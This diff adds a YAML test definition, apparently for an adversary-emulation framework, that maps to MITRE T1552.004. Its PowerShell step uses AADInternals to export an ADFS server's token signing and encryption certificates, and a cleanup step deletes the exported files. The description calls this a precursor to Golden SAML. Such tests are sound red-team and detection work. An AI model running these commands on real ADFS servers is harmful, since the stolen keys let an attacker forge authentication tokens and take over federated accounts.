@@ -1,0 +1,29 @@
+api_version: "2.0"
+name: ADFS token signing and encryption certificates theft - Local
+description: |
+    Retrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as Administrator on an ADFS server.
+    Based on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.
+uuid: 78e95057-d429-4e66-8f82-0f060c1ac96f
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1552: Unsecured Credentials'
+    subtechniques:
+        - 'T1552.004: Private Keys'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: adfs-token-signing-and-encryption-certificates-theft---local
+      inline: |
+        Import-Module AADInternals -Force
+        Export-AADIntADFSCertificates
+        Get-ChildItem | Where-Object {$_ -like "ADFS*"}
+        Write-Host "`nCertificates retrieved successfully"
+      executor: powershell
+      cleanup:
+        inline: |
+            Remove-Item -Path ".\ADFS_encryption.pfx" -ErrorAction Ignore
+            Remove-Item -Path ".\ADFS_signing.pfx" -ErrorAction Ignore
+        executor: powershell
